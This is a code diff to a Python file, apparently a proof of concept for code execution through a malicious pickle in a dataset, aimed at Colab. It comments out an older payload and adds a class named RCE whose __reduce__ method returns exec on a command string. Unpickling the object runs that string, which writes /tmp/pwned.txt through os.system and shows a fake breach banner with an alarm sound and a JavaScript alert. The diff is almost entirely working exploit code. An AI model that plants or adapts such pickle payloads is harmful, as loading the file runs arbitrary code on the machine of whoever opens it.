@@ -22,40 +22,82 @@ from IPython.display import display, HTML
 
 
 
-class RCE:
-    def __reduce__(self):
-        STRING = """
+# class RCE:
+#     def __reduce__(self):
+#         STRING = """
+# from IPython.display import display, HTML, Javascript
+
+# # Animated banner
+# display(HTML(\"\"\"
+# <div id='alertbox' style='
+#     background: linear-gradient(45deg, red, black);
+#     color: white;
+#     font-size: 24px;
+#     text-align: center;
+#     padding: 20px;
+#     border: 4px solid white;
+#     animation: pulse 1s infinite;
+# '>
+#     ⚠️ SYSTEM BREACH DETECTED ⚠️
+# </div>
+# <style>
+# @keyframes pulse {
+#     0% {transform: scale(1);}
+#     50% {transform: scale(1.05);}
+#     100% {transform: scale(1);}
+# }
+# </style>
+# <audio autoplay>
+#     <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg">
+# </audio>
+# \"\"\"))
+
+# # JS alert
+# display(Javascript("alert('⚠️ WARNING: Exploit triggered in Colab!');"))
+# """
+#         return (exec, (STRING,))
+
+
+
+import os
+import pickle
 from IPython.display import display, HTML, Javascript
 
-# Animated banner
-display(HTML(\"\"\"
-<div id='alertbox' style='
-    background: linear-gradient(45deg, red, black);
-    color: white;
-    font-size: 24px;
-    text-align: center;
-    padding: 20px;
-    border: 4px solid white;
-    animation: pulse 1s infinite;
-'>
-    ⚠️ SYSTEM BREACH DETECTED ⚠️
-</div>
-<style>
-@keyframes pulse {
-    0% {transform: scale(1);}
-    50% {transform: scale(1.05);}
-    100% {transform: scale(1);}
-}
-</style>
-<audio autoplay>
-    <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg">
-</audio>
-\"\"\"))
+class RCE:
+    def __reduce__(self):
+        # Combined command tuple that executes both exploits
+        combined_command = (
+            "import os;"
+            "os.system(\"echo 'RCE from dataset' > /tmp/pwned.txt\");"
+            "from IPython.display import display, HTML, Javascript;"
+            "display(HTML('''"
+            "<div id='alertbox' style='"
+            "    background: linear-gradient(45deg, red, black);"
+            "    color: white;"
+            "    font-size: 24px;"
+            "    text-align: center;"
+            "    padding: 20px;"
+            "    border: 4px solid white;"
+            "    animation: pulse 1s infinite;"
+            "'>"
+            "    ⚠️ SYSTEM BREACH DETECTED ⚠️"
+            "</div>"
+            "<style>"
+            "@keyframes pulse {"
+            "    0% {transform: scale(1);}"
+            "    50% {transform: scale(1.05);}"
+            "    100% {transform: scale(1);}"
+            "}"
+            "</style>"
+            "<audio autoplay>"
+            "    <source src='https://actions.google.com/sounds/v1/alarms/beep_short.ogg' type='audio/ogg'>"
+            "</audio>"
+            "'''));"
+            "display(Javascript(\"alert('⚠️ WARNING: Exploit triggered in Colab!');\"));"
+        )
+        return (exec, (combined_command,))
 
-# JS alert
-display(Javascript("alert('⚠️ WARNING: Exploit triggered in Colab!');"))
-"""
-        return (exec, (STRING,))
+
 
 
 
